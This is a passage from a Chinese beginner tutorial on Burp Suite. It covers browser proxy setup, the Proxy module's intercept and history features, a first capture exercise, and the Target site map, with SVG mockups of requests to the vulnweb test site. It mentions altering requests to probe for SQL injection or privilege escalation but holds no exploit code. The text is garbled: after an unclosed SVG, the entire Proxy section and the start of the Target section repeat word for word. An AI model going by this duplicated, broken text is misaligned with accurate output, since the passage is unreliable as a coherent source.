3. 安装后，Firefox右上角会出现FoxyProxy图标
4. 点击图标 → "选项"
5. 点击"添加新代理"
6. 选择"手动代理配置"
7. IP地址：`127.0.0.1`
8. 端口：`8080`
9. 点击"保存"
10. 点击图标选择刚创建的代理

优点：可以一键开启/关闭代理，方便切换

### Chrome配置代理

**方式一：系统代理设置**

Chrome使用系统代理：

**Windows：**
1. 右键"开始" → "设置"
2. 搜索"代理" → 点击"打开计算机的代理设置"
3. 开启"使用代理服务器"
4. 地址：`127.0.0.1`
5. 端口：`8080`
6. 保存

**macOS：**
1. 打开"系统设置" → "网络"
2. 选择当前网络 → "详细信息"
3. 点击"代理"标签
4. 勾选"网页代理(HTTP)"和"安全网页代理(HTTPS)"
5. 地址：`127.0.0.1`
6. 端口：`8080`
7. 点击"好"

**方式二：使用SwitchyOmega插件（推荐）**

1. 安装SwitchyOmega：访问 https://chrome.google.com/webstore/detail/proxy-switchyomega/
2. 点击"添加到Chrome"安装
3. 安装后，Chrome右上角会出现SwitchyOmega图标
4. 点击图标 → "选项"
5. 点击"新建情景模式"
6. 选择"代理服务器"
7. 名称：Burp Suite
8. 代理协议：HTTP
9. 代理服务器：`127.0.0.1`
10. 代理端口：`8080`
11. 点击"应用选项"
12. 点击图标选择"Burp Suite"

### Burp Suite内置浏览器

Burp Suite自带一个内置浏览器，已经配置好代理，推荐初学者使用：

1. 打开Burp Suite
2. 点击顶部菜单"Browser"
3. 选择"Launch Burp's browser"
4. 内置浏览器会自动打开，代理已配置好

优点：无需手动配置代理和证书，开箱即用。

---

## 1.9 Proxy模块详解

### Proxy模块是什么？

Proxy（代理）模块是Burp Suite的核心功能。就像一个邮局，拦截所有来往的信件（HTTP请求和响应），你可以查看每封信的内容，甚至可以修改信件内容再发送出去。

### Proxy模块界面

打开Burp Suite，点击"Proxy"标签，你会看到几个子标签：

**🛑 Proxy 拦截界面功能说明：**

<svg viewBox="0 0 800 430" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:800px;">

  <defs>
    <linearGradient id="uiBg" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#0b1120"/>
      <stop offset="100%" stop-color="#020617"/>
    </linearGradient>
  </defs>
  <rect width="800" height="430" rx="12" fill="url(#uiBg)" stroke="#1e293b"/>
  <!-- 标题栏 -->
  <rect x="0" y="0" width="800" height="32" rx="12" fill="#1e293b"/>
  <rect x="0" y="16" width="800" height="16" fill="#1e293b"/>
  <circle cx="18" cy="16" r="6" fill="#ef4444"/>
  <circle cx="38" cy="16" r="6" fill="#eab308"/>
  <circle cx="58" cy="16" r="6" fill="#22c55e"/>
  <text x="400" y="22" text-anchor="middle" fill="#cbd5e1" font-size="12" font-family="Arial">Burp Suite - Dashboard / Proxy</text>

  <!-- 顶部模块标签栏 -->
  <g>
    <rect x="0" y="32" width="800" height="34" fill="#0f172a"/>
    <g transform="translate(8, 38)">
      <rect x="0" y="0" width="90" height="22" rx="4" fill="#020617" stroke="#475569"/><text x="45" y="16" text-anchor="middle" fill="#94a3b8" font-size="11" font-family="Arial">Dashboard</text>
      <rect x="96" y="0" width="90" height="22" rx="4" fill="#7c3aed" opacity="0.3" stroke="#a78bfa"/><text x="141" y="16" text-anchor="middle" fill="#e9d5ff" font-size="11" font-weight="bold" font-family="Arial">🔴 Proxy</text>
      <rect x="192" y="0" width="90" height="22" rx="4" fill="#020617" stroke="#475569"/><text x="237" y="16" text-anchor="middle" fill="#94a3b8" font-size="11" font-family="Arial">Target</text>
      <rect x="288" y="0" width="90" height="22" rx="4" fill="#020617" stroke="#475569"/><text x="333" y="16" text-anchor="middle" fill="#94a3b8" font-size="11" font-family="Arial">Intruder</text>
      <rect x="384" y="0" width="90" height="22" rx="4" fill="#020617" stroke="#475569"/><text x="429" y="16" text-anchor="middle" fill="#94a3b8" font-size="11" font-family="Arial">Repeater</text>
      <rect x="480" y="0" width="90" height="22" rx="4" fill="#020617" stroke="#475569"/><text x="525" y="16" text-anchor="middle" fill="#94a3b8" font-size="11" font-family="Arial">Scanner</text>
    </g>
  </g>

  <!-- 子标签栏 -->
  <g transform="translate(0, 66)">
    <rect x="0" y="0" width="800" height="30" fill="#111827"/>
    <rect x="10" y="4" width="110" height="24" rx="5" fill="#7c3aed" stroke="#a78bfa"/>
    <text x="65" y="21" text-anchor="middle" fill="#fff" font-size="12" font-weight="bold" font-family="Arial">● Intercept (ON)</text>
    <rect x="126" y="4" width="110" height="24" rx="5" fill="#0f172a" stroke="#334155"/>
    <text x="181" y="21" text-anchor="middle" fill="#94a3b8" font-size="12" font-family="Arial">HTTP history</text>
    <rect x="242" y="4" width="140" height="24" rx="5" fill="#0f172a" stroke="#334155"/>
    <text x="312" y="21" text-anchor="middle" fill="#94a3b8" font-size="12" font-family="Arial">WebSockets history</text>
    <rect x="388" y="4" width="90" height="24" rx="5" fill="#0f172a" stroke="#334155"/>
    <text x="433" y="21" text-anchor="middle" fill="#94a3b8" font-size="12" font-family="Arial">Proxy settings</text>
  </g>

  <!-- 被拦截的请求区域 -->
  <g transform="translate(10, 108)">
    <rect x="0" y="0" width="780" height="200" rx="6" fill="#0b1120" stroke="#1e293b"/>
    <!-- 方法行 -->
    <rect x="0" y="0" width="780" height="28" fill="#1e293b" rx="6"/>
    <rect x="0" y="14" width="780" height="14" fill="#1e293b"/>
    <text x="14" y="19" fill="#22d3ee" font-size="12" font-weight="bold" font-family="Arial">POST</text>
    <text x="60" y="19" fill="#e2e8f0" font-size="12" font-family="Arial">/login.php HTTP/1.1</text>
    <text x="620" y="19" fill="#f59e0b" font-size="11" font-weight="bold" font-family="Arial">⚠ INTERCEPTED · 已被拦截</text>
    <!-- 请求头 -->
    <g font-family="Consolas, monospace" font-size="11">
      <text x="14" y="52" fill="#f472b6">Host:</text><text x="64" y="52" fill="#cbd5e1">testphp.vulnweb.com</text>
      <text x="14" y="70" fill="#f472b6">User-Agent:</text><text x="104" y="70" fill="#cbd5e1">Mozilla/5.0 (Windows NT 10.0; Win64; x64)</text>
      <text x="14" y="88" fill="#f472b6">Accept:</text><text x="72" y="88" fill="#cbd5e1">text/html,application/xhtml+xml</text>
      <text x="14" y="106" fill="#f472b6">Content-Type:</text><text x="110" y="106" fill="#cbd5e1">application/x-www-form-urlencoded</text>
      <text x="14" y="124" fill="#f472b6">Content-Length:</text><text x="122" y="124" fill="#fde047">49</text>
      <text x="14" y="142" fill="#f472b6">Cookie:</text><text x="64" y="142" fill="#cbd5e1">PHPSESSID=</text><text x="156" y="142" fill="#fde047">[可在此处修改Cookie]</text>
    </g>
    <!-- 分割线 -->
    <line x1="0" y1="158" x2="780" y2="158" stroke="#334155" stroke-width="1"/>
    <text x="14" y="175" fill="#64748b" font-size="10" font-family="Arial">—— 空行表示请求头结束，下方是请求体（POST参数）——</text>
    <!-- 请求体 -->
    <g font-family="Consolas, monospace" font-size="12">
      <text x="14" y="195" fill="#86efac">uname=</text><text x="76" y="195" fill="#fbbf24" font-weight="bold">admin</text>
      <text x="140" y="195" fill="#86efac">&pass=</text><text x="195" y="195" fill="#ef4444" font-weight="bold">[ 🔓 明文密码可任意修改！]</text>
    </g>
  </g>

  <!-- 底部操作按钮栏 -->
  <g transform="translate(10, 318)">
    <rect x="0" y="0" width="780" height="40" rx="6" fill="#0f172a" stroke="#334155"/>
    <rect x="12" y="8" width="108" height="24" rx="4" fill="#16a34a" stroke="#22c55e"/>
    <text x="66" y="24" text-anchor="middle" fill="#fff" font-size="12" font-weight="bold" font-family="Arial">⏩ Forward (放行)</text>
    <rect x="128" y="8" width="108" height="24" rx="4" fill="#dc2626" stroke="#ef4444"/>
    <text x="182" y="24" text-anchor="middle" fill="#fff" font-size="12" font-weight="bold" font-family="Arial">🗑️ Drop (丢弃)</text>
    <rect x="244" y="8" width="118" height="24" rx="4" fill="#1e40af" stroke="#3b82f6"/>
    <text x="303" y="24" text-anchor="middle" fill="#fff" font-size="12" font-weight="bold" font-family="Arial">🔄 Follow redirection</text>
    <rect x="370" y="8" width="120" height="24" rx="4" fill="#7c3aed" stroke="#a855f7"/>
    <text x="430" y="24" text-anchor="middle" fill="#fff" font-size="12" font-weight="bold" font-family="Arial">📤 Send to Repeater</text>
    <rect x="498" y="8" width="118" height="24" rx="4" fill="#b45309" stroke="#f59e0b"/>
    <text x="557" y="24" text-anchor="middle" fill="#fff" font-size="12" font-weight="bold" font-family="Arial">💥 Send to Intruder</text>
    <rect x="624" y="8" width="150" height="24" rx="4" fill="#475569" stroke="#94a3b8"/>
    <text x="699" y="24" text-anchor="middle" fill="#e2e8f0" font-size="12" font-family="Arial">🔘 Intercept is on</text>
  </g>

  <!-- 底部帮助 -->
  <g transform="translate(10, 368)">
    <rect x="0" y="0" width="780" height="52" rx="6" fill="#1e1b4b" stroke="#4c1d95" opacity="0.7"/>
    <text x="16" y="22" fill="#fbbf24" font-size="13" font-weight="bold" font-family="Arial">💡 说明：</text>
    <text x="16" y="42" fill="#ddd6fe" font-size="12" font-family="Arial">被拦截时请求会"卡"在 Burp，不会发送到服务器。你可以修改参数、Cookie、UA 等内容，然后点 Forward 放行；如果不想发就点 Drop 直接丢弃。</text>
  </g>
</svg>

| 标签 | 功能说明 |
|------|----------|
| Intercept | 拦截请求，查看和修改被拦截的内容 |
| HTTP history | 记录所有HTTP请求和响应的历史 |
| WebSocket history | 记录WebSocket通信历史 |
| Options | 配置代理选项 |

### Intercept（拦截）功能详解

**什么是拦截？**

拦截就是"暂停"浏览器的请求，让请求先停在Burp Suite，等你审查后再决定是否放行。

**拦截开关：**

- "Intercept is on"：拦截开启，请求会被暂停
- "Intercept is off"：拦截关闭，请求直接放行

点击按钮可以切换状态。

**拦截后的操作按钮：**

| 按钮 | 功能 | 说明 |
|------|------|------|
| Forward | 放行 | 将当前请求发送给服务器 |
| Drop | 丢弃 | 取消当前请求，不发送 |
| Intercept | 开关 | 切换拦截状态 |
| Action | 操作菜单 | 更多操作选项 |

**请求内容显示：**

被拦截的请求会显示在下方区域，分为四个标签：

| 标签 | 内容 |
|------|------|
| Request | 请求内容（浏览器发给服务器的） |
| Response | 响应内容（服务器发给浏览器的） |
| Notes | 添加备注 |
| Hex | 十六进制视图 |

**修改请求：**

拦截请求后，你可以直接在文本框中修改内容。比如：
- 修改用户名尝试SQL注入
- 修改Cookie尝试越权访问
- 修改参数测试逻辑漏洞

修改完成后，点击"Forward"发送修改后的请求。

### HTTP history（历史记录）功能详解

即使关闭拦截，所有HTTP请求也会被记录在"HTTP history"中。

**历史记录界面：**

| 列 | 内容说明 |
|------|----------|
| # | 序号 |
| Host | 目标主机 |
| Method | HTTP方法（GET/POST等） |
| Path | 请求路径 |
| Status | 响应状态码 |
| Length | 响应长度 |
| MIME type | 内容类型 |
| Extension | 文件扩展名 |
| Title | 网页标题 |
| Comment | 注释 |
| SSL | 是否HTTPS |

**使用技巧：**

1. **过滤显示**：点击上方"Filter"按钮，可以设置过滤条件
   - 只显示特定域名的请求
   - 只显示特定状态码的请求
   - 只显示特定文件类型的请求

2. **快速操作**：右键点击任意请求，可以：
   - "Send to Repeater"：发送到重发器进行手工测试
   - "Send to Intruder"：发送到入侵者进行暴力破解
   - "Send to Spider"：发送到爬虫继续爬取
   - "Send to Scanner"：发送到扫描器扫描漏洞（专业版）

3. **搜索功能**：点击"Search"按钮，可以搜索请求或响应中的关键词

### Proxy Options（选项）配置详解

点击"Options"子标签，可以看到各种代理配置：

**Proxy listeners（代理监听器）：**

这是Burp Suite监听流量端口的地方。默认配置：
- 绑定地址：127.0.0.1（本机）
- 绑定端口：8080

你可以添加多个监听器，比如：
- 添加8081端口监听其他流量
- 配置公网IP监听远程流量

**Request interception rules（请求拦截规则）：**

可以设置自动拦截特定类型的请求，比如：
- 只拦截包含特定关键词的请求
- 只拦截特定文件扩展名的请求
- 只拦截POST请求

**Response interception rules（响应拦截规则）：**

可以设置自动拦截特定类型的响应，比如：
- 只拦截包含敏感信息的响应
- 只拦截特定状态码的响应

### 实战：第一次抓包

让我们来实际体验一下抓包的过程：

**准备工作：**
1. 启动Burp Suite
2. 配置浏览器代理为127.0.0.1:8080
3. 确保证书已安装
4. 开启拦截（Intercept is on）

**开始抓包：**

1. 在浏览器访问`http://www.baidu.com`
2. Burp Suite会拦截第一个请求
3. 你会看到类似这样的内容：
   ```http
   GET / HTTP/1.1
   Host: www.baidu.com
   User-Agent: Mozilla/5.0 ...
   Accept: text/html,application/xhtml+xml...
   Accept-Language: zh-CN,zh;q=0.9
   Accept-Encoding: gzip, deflate
   Connection: keep-alive
   ```
4. 点击"Forward"放行请求
5. 继续点击"Forward"放行后续请求
6. 最终，百度首页会在浏览器中显示

**查看历史：**
1. 关闭拦截（Intercept is off）
2. 切换到"HTTP history"标签
3. 你会看到所有请求的完整历史记录

---

## 1.10 Target模块详解

### Target模块是什么？

Target模块就像一个"情报中心"，它帮你整理和分析目标网站的所有信息。

想象你要调查一个大公司，你需要：
- 了解公司的结构（有哪些部门）
- 了解公司的人员（有哪些员工）
- 了解公司的资产（有哪些设备）

Target模块做的就是这些工作，它帮你：
- 建立目标网站的完整地图
- 分析网站的页面结构
- 管理测试范围

### Target模块界面

点击"Target"标签，你会看到两个子标签：

| 标签 | 功能 |
|------|------|
| Site map | 站点地图，展示目标网站的完整结构 |
| Scope | 测试范围，定义哪些目标需要测试 |

### Site map（站点地图）详解

站点地图就像网站的"家族树"，展示网站的所有页面和资源。

**🗺️ Target 站点地图（Site map）界面说明：**

<svg viewBox="0 0 800 400" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:800px;">

  <defs>
    <linearGradient id="sitemapBg" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#0b1220"/>
      <stop offset="100%" stop-color="#020617"/>
    </linearGradient>
  </defs>
  <rect width="800" height="400" rx="12" fill="url(#sitemapBg)" stroke="#1e293b"/>
  <text x="400" y="26" text-anchor="middle" fill="#e2e8f0" font-size="16" font-weight="bold" font-family="Arial">🗂️ Target → Site map 站点地图界面</text>

  <!-- 左侧：树形目录 -->
  <g transform="translate(12, 42)">
    <rect x="0" y="0" width="350" height="346" rx="8" fill="#0f172a" stroke="#334155" stroke-width="1.5"/>
    <rect x="0" y="0" width="350" height="28" rx="8" fill="#1e293b"/>
    <rect x="0" y="14" width="350" height="14" fill="#1e293b"/>
    <text x="12" y="20" fill="#fbbf24" font-size="12" font-weight="bold" font-family="Arial">🌲 站点树结构（左面板）</text>
    <!-- 树节点 -->
    <g font-family="Arial" font-size="12">
      <!-- host -->
      <text x="14" y="54" fill="#7c3aed" font-weight="bold">▼ 📁 testphp.vulnweb.com</text>
      <text x="280" y="54" fill="#22c55e" text-anchor="end" font-size="11">✅ 200 OK</text>
      <!-- 一级目录 -->
      <text x="34" y="76" fill="#fbbf24">▼ 📂 /admin</text>
      <text x="280" y="76" fill="#ef4444" text-anchor="end" font-size="11">🔒 403 Forbidden</text>
      <text x="54" y="96" fill="#e2e8f0">📄 login.php</text>
      <text x="280" y="96" fill="#22c55e" text-anchor="end" font-size="11">200</text>
      <text x="54" y="116" fill="#e2e8f0">📄 index.php</text>
      <text x="280" y="116" fill="#fbbf24" text-anchor="end" font-size="11">302→</text>

      <text x="34" y="136" fill="#fbbf24">▼ 📂 /images</text>
      <text x="54" y="156" fill="#94a3b8">🖼️ logo.png</text>
      <text x="280" y="156" fill="#22c55e" text-anchor="end" font-size="11">200</text>
      <text x="54" y="176" fill="#94a3b8">🖼️ banner.jpg</text>
      <text x="280" y="176" fill="#22c55e" text-anchor="end" font-size="11">200</text>

      <text x="34" y="196" fill="#fbbf24">▶ 📂 /css</text>
      <text x="34" y="216" fill="#fbbf24">▶ 📂 /js</text>

      <text x="34" y="236" fill="#fbbf24">▼ 📂 /cgi-bin</text>
      <text x="54" y="256" fill="#e2e8f0">📄 search.php?id=1</text>
      <text x="280" y="256" fill="#ef4444" text-anchor="end" font-size="11">⚠ 500 Error</text>
      <text x="54" y="276" fill="#e2e8f0">📄 userinfo.php?uid=2</text>
      <text x="280" y="276" fill="#22c55e" text-anchor="end" font-size="11">200</text>

      <text x="14" y="300" fill="#64748b" font-size="11">─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─</text>
      <text x="14" y="322" fill="#64748b" font-size="11">图例：</text>
      <circle cx="60" cy="319" r="4" fill="#22c55e"/><text x="70" y="323" fill="#94a3b8" font-size="11">正常</text>
      <circle cx="110" cy="319" r="4" fill="#fbbf24"/><text x="120" y="323" fill="#94a3b8" font-size="11">跳转</text>
      <circle cx="160" cy="319" r="4" fill="#ef4444"/><text x="170" y="323" fill="#94a3b8" font-size="11">错误/重点</text>
    </g>
  </g>

  <!-- 右侧：请求/响应详情 -->
  <g transform="translate(374, 42)">
    <rect x="0" y="0" width="414" height="346" rx="8" fill="#0f172a" stroke="#334155" stroke-width="1.5"/>
    <rect x="0" y="0" width="414" height="28" rx="8" fill="#1e293b"/>
    <rect x="0" y="14" width="414" height="14" fill="#1e293b"/>
    <text x="12" y="20" fill="#38bdf8" font-size="12" font-weight="bold" font-family="Arial">📋 选中项的 Request / Response（右面板）</text>
    <!-- 内部tab -->
    <g transform="translate(6, 34)">
      <rect x="0" y="0" width="78" height="22" rx="4" fill="#0ea5e9" stroke="#38bdf8"/>
      <text x="39" y="16" text-anchor="middle" fill="#fff" font-size="11" font-weight="bold" font-family="Arial">Request</text>
      <rect x="84" y="0" width="86" height="22" rx="4" fill="#020617" stroke="#475569"/>
      <text x="127" y="16" text-anchor="middle" fill="#94a3b8" font-size="11" font-family="Arial">Response</text>
      <rect x="176" y="0" width="86" height="22" rx="4" fill="#020617" stroke="#475569"/>
      <text x="219" y="16" text-anchor="middle" fill="#94a3b8" font-size="11" font-family="Arial">Headers</text>
      <rect x="268" y="0" width="86" height="22" rx="4" fill="#020617" stroke="#475569"/>
      <text x="311" y="16" text-anchor="middle" fill="#94a3b8" font-size="11" font-family="Arial">Hex</text>
    </g>
    <!-- 请求内容 -->
    <g transform="translate(10, 72)" font-family="Consolas, monospace" font-size="11">
      <rect x="0" y="0" width="394" height="262" rx="4" fill="#020617" stroke="#1e293b"/>
      <text x="10" y="22" fill="#22d3ee" font-weight="bold">GET /cgi-bin/search.php?id=1 HTTP/1.1</text>
      <text x="10" y="42" fill="#f472b6">Host:</text><text x="52" y="42" fill="#cbd5e1">testphp.vulnweb.com</text>
      <text x="10" y="60" fill="#f472b6">User-Agent:</text><text x="90" y="60" fill="#cbd5e1">Mozilla/5.0 ... Firefox/120</text>
      <text x="10" y="78" fill="#f472b6">Referer:</text><text x="68" y="78" fill="#cbd5e1">http://testphp.vulnweb.com/</text>
      <text x="10" y="96" fill="#f472b6">Connection:</text><text x="88" y="96" fill="#cbd5e1">keep-alive</text>
      <text x="10" y="118" fill="#64748b">─────────────────────────────</text>
      <text x="10" y="140" fill="#ef4444" font-weight="bold">⚠️ HTTP/1.1 500 Internal Server Error</text>
      <text x="10" y="162" fill="#86efac">Date: Wed, 26 Jun 2026 08:12:33 GMT</text>
      <text x="10" y="180" fill="#86efac">Server: Apache/2.2.22 (Ubuntu)</text>
      <text x="10" y="198" fill="#86efac">X-Powered-By: PHP/5.3.10</text>
      <text x="10" y="220" fill="#fbbf24">&lt;b&gt;Warning&lt;/b&gt;: mysql_fetch_assoc() expects...</text>
      <text x="10" y="240" fill="#fde047">🔴 报错泄露 MySQL 信息！极有可能存在 SQL 注入！</text>
    </g>
  </g>


| 标签 | 功能说明 |
|------|----------|
| Intercept | 拦截请求，查看和修改被拦截的内容 |
| HTTP history | 记录所有HTTP请求和响应的历史 |
| WebSocket history | 记录WebSocket通信历史 |
| Options | 配置代理选项 |

### Intercept（拦截）功能详解

**什么是拦截？**

拦截就是"暂停"浏览器的请求，让请求先停在Burp Suite，等你审查后再决定是否放行。

**拦截开关：**

- "Intercept is on"：拦截开启，请求会被暂停
- "Intercept is off"：拦截关闭，请求直接放行

点击按钮可以切换状态。

**拦截后的操作按钮：**

| 按钮 | 功能 | 说明 |
|------|------|------|
| Forward | 放行 | 将当前请求发送给服务器 |
| Drop | 丢弃 | 取消当前请求，不发送 |
| Intercept | 开关 | 切换拦截状态 |
| Action | 操作菜单 | 更多操作选项 |

**请求内容显示：**

被拦截的请求会显示在下方区域，分为四个标签：

| 标签 | 内容 |
|------|------|
| Request | 请求内容（浏览器发给服务器的） |
| Response | 响应内容（服务器发给浏览器的） |
| Notes | 添加备注 |
| Hex | 十六进制视图 |

**修改请求：**

拦截请求后，你可以直接在文本框中修改内容。比如：
- 修改用户名尝试SQL注入
- 修改Cookie尝试越权访问
- 修改参数测试逻辑漏洞

修改完成后，点击"Forward"发送修改后的请求。

### HTTP history（历史记录）功能详解

即使关闭拦截，所有HTTP请求也会被记录在"HTTP history"中。

**历史记录界面：**

| 列 | 内容说明 |
|------|----------|
| # | 序号 |
| Host | 目标主机 |
| Method | HTTP方法（GET/POST等） |
| Path | 请求路径 |
| Status | 响应状态码 |
| Length | 响应长度 |
| MIME type | 内容类型 |
| Extension | 文件扩展名 |
| Title | 网页标题 |
| Comment | 注释 |
| SSL | 是否HTTPS |

**使用技巧：**

1. **过滤显示**：点击上方"Filter"按钮，可以设置过滤条件
   - 只显示特定域名的请求
   - 只显示特定状态码的请求
   - 只显示特定文件类型的请求

2. **快速操作**：右键点击任意请求，可以：
   - "Send to Repeater"：发送到重发器进行手工测试
   - "Send to Intruder"：发送到入侵者进行暴力破解
   - "Send to Spider"：发送到爬虫继续爬取
   - "Send to Scanner"：发送到扫描器扫描漏洞（专业版）

3. **搜索功能**：点击"Search"按钮，可以搜索请求或响应中的关键词

### Proxy Options（选项）配置详解

点击"Options"子标签，可以看到各种代理配置：

**Proxy listeners（代理监听器）：**

这是Burp Suite监听流量端口的地方。默认配置：
- 绑定地址：127.0.0.1（本机）
- 绑定端口：8080

你可以添加多个监听器，比如：
- 添加8081端口监听其他流量
- 配置公网IP监听远程流量

**Request interception rules（请求拦截规则）：**

可以设置自动拦截特定类型的请求，比如：
- 只拦截包含特定关键词的请求
- 只拦截特定文件扩展名的请求
- 只拦截POST请求

**Response interception rules（响应拦截规则）：**

可以设置自动拦截特定类型的响应，比如：
- 只拦截包含敏感信息的响应
- 只拦截特定状态码的响应

### 实战：第一次抓包

让我们来实际体验一下抓包的过程：

**准备工作：**
1. 启动Burp Suite
2. 配置浏览器代理为127.0.0.1:8080
3. 确保证书已安装
4. 开启拦截（Intercept is on）

**开始抓包：**

1. 在浏览器访问`http://www.baidu.com`
2. Burp Suite会拦截第一个请求
3. 你会看到类似这样的内容：
   ```http
   GET / HTTP/1.1
   Host: www.baidu.com
   User-Agent: Mozilla/5.0 ...
   Accept: text/html,application/xhtml+xml...
   Accept-Language: zh-CN,zh;q=0.9
   Accept-Encoding: gzip, deflate
   Connection: keep-alive
   ```
4. 点击"Forward"放行请求
5. 继续点击"Forward"放行后续请求
6. 最终，百度首页会在浏览器中显示

**查看历史：**
1. 关闭拦截（Intercept is off）
2. 切换到"HTTP history"标签
3. 你会看到所有请求的完整历史记录

---

## 1.10 Target模块详解

### Target模块是什么？

Target模块就像一个"情报中心"，它帮你整理和分析目标网站的所有信息。

想象你要调查一个大公司，你需要：
- 了解公司的结构（有哪些部门）
- 了解公司的人员（有哪些员工）
- 了解公司的资产（有哪些设备）

Target模块做的就是这些工作，它帮你：
- 建立目标网站的完整地图
- 分析网站的页面结构
- 管理测试范围

### Target模块界面

点击"Target"标签，你会看到两个子标签：

| 标签 | 功能 |
|------|------|
| Site map | 站点地图，展示目标网站的完整结构 |
| Scope | 测试范围，定义哪些目标需要测试 |

### Site map（站点地图）详解

站点地图就像网站的"家族树"，展示网站的所有页面和资源。

**🗺️ Target 站点地图（Site map）界面说明：**

<svg viewBox="0 0 800 400" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:800px;">

  <defs>
    <linearGradient id="sitemapBg" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#0b1220"/>
      <stop offset="100%" stop-color="#020617"/>
    </linearGradient>
  </defs>
  <rect width="800" height="400" rx="12" fill="url(#sitemapBg)" stroke="#1e293b"/>
  <text x="400" y="26" text-anchor="middle" fill="#e2e8f0" font-size="16" font-weight="bold" font-family="Arial">🗂️ Target → Site map 站点地图界面</text>

  <!-- 左侧：树形目录 -->
  <g transform="translate(12, 42)">
    <rect x="0" y="0" width="350" height="346" rx="8" fill="#0f172a" stroke="#334155" stroke-width="1.5"/>
    <rect x="0" y="0" width="350" height="28" rx="8" fill="#1e293b"/>
    <rect x="0" y="14" width="350" height="14" fill="#1e293b"/>
    <text x="12" y="20" fill="#fbbf24" font-size="12" font-weight="bold" font-family="Arial">🌲 站点树结构（左面板）</text>
    <!-- 树节点 -->
    <g font-family="Arial" font-size="12">
      <!-- host -->
      <text x="14" y="54" fill="#7c3aed" font-weight="bold">▼ 📁 testphp.vulnweb.com</text>
      <text x="280" y="54" fill="#22c55e" text-anchor="end" font-size="11">✅ 200 OK</text>
      <!-- 一级目录 -->
      <text x="34" y="76" fill="#fbbf24">▼ 📂 /admin</text>
      <text x="280" y="76" fill="#ef4444" text-anchor="end" font-size="11">🔒 403 Forbidden</text>
      <text x="54" y="96" fill="#e2e8f0">📄 login.php</text>
      <text x="280" y="96" fill="#22c55e" text-anchor="end" font-size="11">200</text>
      <text x="54" y="116" fill="#e2e8f0">📄 index.php</text>
      <text x="280" y="116" fill="#fbbf24" text-anchor="end" font-size="11">302→</text>

      <text x="34" y="136" fill="#fbbf24">▼ 📂 /images</text>
      <text x="54" y="156" fill="#94a3b8">🖼️ logo.png</text>
      <text x="280" y="156" fill="#22c55e" text-anchor="end" font-size="11">200</text>
      <text x="54" y="176" fill="#94a3b8">🖼️ banner.jpg</text>
      <text x="280" y="176" fill="#22c55e" text-anchor="end" font-size="11">200</text>

      <text x="34" y="196" fill="#fbbf24">▶ 📂 /css</text>
      <text x="34" y="216" fill="#fbbf24">▶ 📂 /js</text>

      <text x="34" y="236" fill="#fbbf24">▼ 📂 /cgi-bin</text>
      <text x="54" y="256" fill="#e2e8f0">📄 search.php?id=1</text>
      <text x="280" y="256" fill="#ef4444" text-anchor="end" font-size="11">⚠ 500 Error</text>
      <text x="54" y="276" fill="#e2e8f0">📄 userinfo.php?uid=2</text>
      <text x="280" y="276" fill="#22c55e" text-anchor="end" font-size="11">200</text>

      <text x="14" y="300" fill="#64748b" font-size="11">─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─</text>
      <text x="14" y="322" fill="#64748b" font-size="11">图例：</text>
      <circle cx="60" cy="319" r="4" fill="#22c55e"/><text x="70" y="323" fill="#94a3b8" font-size="11">正常</text>
      <circle cx="110" cy="319" r="4" fill="#fbbf24"/><text x="120" y="323" fill="#94a3b8" font-size="11">跳转</text>
      <circle cx="160" cy="319" r="4" fill="#ef4444"/><text x="170" y="323" fill="#94a3b8" font-size="11">错误/重点</text>
    </g>
  </g>

  <!-- 右侧：请求/响应详情 -->
  <g transform="translate(374, 42)">
    <rect x="0" y="0" width="414" height="346" rx="8" fill="#0f172a" stroke="#334155" stroke-width="1.5"/>
    <rect x="0" y="0" width="414" height="28" rx="8" fill="#1e293b"/>
    <rect x="0" y="14" width="414" height="14" fill="#1e293b"/>
    <text x="12" y="20" fill="#38bdf8" font-size="12" font-weight="bold" font-family="Arial">📋 选中项的 Request / Response（右面板）</text>
    <!-- 内部tab -->
    <g transform="translate(6, 34)">
      <rect x="0" y="0" width="78" height="22" rx="4" fill="#0ea5e9" stroke="#38bdf8"/>
      <text x="39" y="16" text-anchor="middle" fill="#fff" font-size="11" font-weight="bold" font-family="Arial">Request</text>
      <rect x="84" y="0" width="86" height="22" rx="4" fill="#020617" stroke="#475569"/>
      <text x="127" y="16" text-anchor="middle" fill="#94a3b8" font-size="11" font-family="Arial">Response</text>
      <rect x="176" y="0" width="86" height="22" rx="4" fill="#020617" stroke="#475569"/>
      <text x="219" y="16" text-anchor="middle" fill="#94a3b8" font-size="11" font-family="Arial">Headers</text>
      <rect x="268" y="0" width="86" height="22" rx="4" fill="#020617" stroke="#475569"/>
      <text x="311" y="16" text-anchor="middle" fill="#94a3b8" font-size="11" font-family="Arial">Hex</text>
    </g>
    <!-- 请求内容 -->
    <g transform="translate(10, 72)" font-family="Consolas, monospace" font-size="11">
      <rect x="0" y="0" width="394" height="262" rx="4" fill="#020617" stroke="#1e293b"/>
      <text x="10" y="22" fill="#22d3ee" font-weight="bold">GET /cgi-bin/search.php?id=1 HTTP/1.1</text>
      <text x="10" y="42" fill="#f472b6">Host:</text><text x="52" y="42" fill="#cbd5e1">testphp.vulnweb.com</text>
      <text x="10" y="60" fill="#f472b6">User-Agent:</text><text x="90" y="60" fill="#cbd5e1">Mozilla/5.0 ... Firefox/120</text>
      <text x="10" y="78" fill="#f472b6">Referer:</text><text x="68" y="78" fill="#cbd5e1">http://testphp.vulnweb.com/</text>
      <text x="10" y="96" fill="#f472b6">Connection:</text><text x="88" y="96" fill="#cbd5e1">keep-alive</text>
      <text x="10" y="118" fill="#64748b">─────────────────────────────</text>
      <text x="10" y="140" fill="#ef4444" font-weight="bold">⚠️ HTTP/1.1 500 Internal Server Error</text>
      <text x="10" y="162" fill="#86efac">Date: Wed, 26 Jun 2026 08:12:33 GMT</text>
      <text x="10" y="180" fill="#86efac">Server: Apache/2.2.22 (Ubuntu)</text>
      <text x="10" y="198" fill="#86efac">X-Powered-By: PHP/5.3.10</text>
      <text x="10" y="220" fill="#fbbf24">&lt;b&gt;Warning&lt;/b&gt;: mysql_fetch_assoc() expects...</text>
      <text x="10" y="240" fill="#fde047">🔴 报错泄露 MySQL 信息！极有可能存在 SQL 注入！</text>
    </g>
